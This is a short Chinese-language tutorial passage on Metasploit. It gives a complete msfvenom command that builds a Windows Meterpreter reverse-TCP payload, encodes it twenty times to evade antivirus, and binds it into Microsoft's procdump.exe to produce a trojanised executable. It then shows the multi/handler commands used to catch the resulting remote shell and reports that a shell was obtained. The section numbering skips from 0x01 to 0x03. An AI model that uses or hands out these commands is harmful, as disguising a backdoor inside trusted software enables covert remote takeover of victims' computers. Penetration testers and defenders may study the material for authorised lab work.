# **0x01 利用MSF生成编码捆绑**

下面我用MSF简单的过一下免杀加上捆绑软件的操作

  

  

测试编码并绑定微软官方工具，这里使用官方的procdump做实验

  

在Kali命令行下输入:

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.56.129 LPORT=7777 -e x86šikata\_ga\_nai -x procdump.exe -i 20 -f exe -o t3.exe (-x 指定捆绑文件 -i 编码次数)

# **0x03:利用MSF获得shell**

  

首先在kali输入msfconsole进入Metasploit

  

![](../Images/091e294be95ab1f53e98b20f76bba466.png)

 

选用我们的经典模块multi/handler

命令:use exploit/multi/handler

![](../Images/a569f76d88e5571100d5bf3aed05605a.png)

  

接着设置经典的windows 反弹payload

命令:set payload windows/meterpreter/reverse\_tcp

![](../Images/5d1c9022b3cfbd90a8bff0a83eddf42e.png)

  

最后要设置LHOST、LPORT参数

set LHOST (要监听的本地IP）

set LPORT （要监听本地端口）

 设置好了以后我们自己run开始监听反弹shell  

![](../Images/ebb6b7341a3caf1433dfd7bf8a0ea121.png)  

  

下面我们可以看到已经成功拿到shell命令

![](../Images/43570910209d8a67e35eb2e1ce244030.png)
